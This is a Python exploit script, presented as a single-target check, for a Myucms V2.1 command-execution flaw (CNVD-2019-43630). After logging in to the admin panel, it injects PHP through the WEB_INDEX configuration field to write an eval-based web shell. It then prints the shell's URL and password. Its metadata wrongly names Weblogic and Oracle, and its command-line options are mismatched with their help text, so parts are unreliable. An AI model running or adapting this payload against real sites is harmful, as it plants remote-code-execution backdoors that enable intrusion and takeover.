#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-43630
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
import time
import requests
import datetime
import optparse

code = 'CNVD-2019-43630'
version = '1.0'
author = '秋水'
vulDate = '2020-04-01'
createDate = '2020-04-01'
updateDate = '2020-04-01'
name = 'Myucms命令执行漏洞(CNVD-2019-43630)'
appPowerLink = 'www.oracle.com'
appName = 'Weblogic'
appVersion = '''Myucms V2.1'''
way = '''python CNVD-2019-43630.py -l http://127.0.0.1:7001 -u admin -p admin1234 -k 123456 -f shell'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f.renderText(code)
    # print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


def check():
    session = requests.session()
    address = url + "//admin.php/login/index.html"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    data = {
        "username": "%s" % user,
        "password": "%s" % pwd,
        "kouling": "%s" % kouling
    }
    print("[*] %s 正在尝试登录..." % nowtime())
    try:
        rsp = session.post(address, headers=headers, data=data)
        text = rsp.text
        if "登录成功" in str(text) and rsp.status_code == 200:
            time.sleep(0.3)
            print("[+] 登录成功！")
            address1 = url + "/admin/config/add.html"
            data1 = {
                "WEB_KEJIAN": "0",
                "WEB_KEJIANS": "0",
                "WEB_INDEX": "bbs',file_put_contents('%s.php','<?php @eval($_REQUEST[a])?>'),phpinfo(),'"% file,
                "WEB_RXT": "rar",
                "qiniuopen": "0",
                "secrectKey": "0",
                "accessKey": "0",
                "domain": "0",
                "bucket": "0",
                "WEB_BUG": "true",
                "WEB_REG": "1",
                "WEB_OPE": "1",
                "WEB_GL": "0",
                "WEB_BBS": "1",
                "WEB_SHOP": "1",
                "WEB_TAG": "%E6%8F%92%E4%BB%B6%2C%E5%BB%BA%E8%AE%AE%2C%E6%A8%A1%E6%9D%BF%2C%E7%AD%BE%E5%88%B0%2C%E5%8F%8D%E9%A6%88",
                "Cascade": "1"
            }
            print("[*] %s 开始修改配置文件..." % nowtime())
            rsp1 = session.post(address1, data=data1)
            # print(rsp1.text)
            if rsp1.status_code == 200 and "修改成功" in str(rsp1.text):
                time.sleep(0.3)
                print("[+] 修改成功！")
                print("[+] 过度文件地址为：%s/application/extra/web.php" % url)
                address2 = url + "/application/extra/web.php"
                time.sleep(2)
                rsp2 = session.get(address2, headers=headers)
                if rsp2.status_code == 200:
                    time.sleep(0.3)
                    print("[+] shell已生成，url地址为：%s/application/extra/%s.php" % (url, file))
                    time.sleep(0.3)
                    print("[*] %s shell密码为 a" % nowtime())
                    endtime()
            else:
                time.sleep(0.3)
                print("[-] 修改失败！请稍后重试")
                endtime()
        else:
            time.sleep(0.3)
            print("[-] 登录失败，请重新登录！")
            endtime()
    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


if __name__ == "__main__":
    usage = "python %prog -l/-L <target url> -k/-K <kouling> -u/-U <username> -p/-P <password> -f/-F <filename>"  # 用于显示帮助信息
    parser = optparse.OptionParser(usage)  # 创建对象实例
    parser.add_option('-l', '-L', dest='url', type='string', help='target url',
                      default="http://10.10.10.131")  # 需要的命令行参数
    parser.add_option('-k', '-K', dest='user', type='string', help='kouling', default="admin")
    parser.add_option('-u', '-U', dest='pwd', type='string', help='username', default="admin")
    parser.add_option('-p', '-P', dest='kouling', type='string', help='password', default="123456")
    parser.add_option('-f', '-F', dest='file', type='string', help='shell filename', default="shell")
    (options, args) = parser.parse_args()
    url = options.url
    kouling = options.kouling
    pwd = options.pwd
    user = options.user
    file = options.file
    output()
    check()
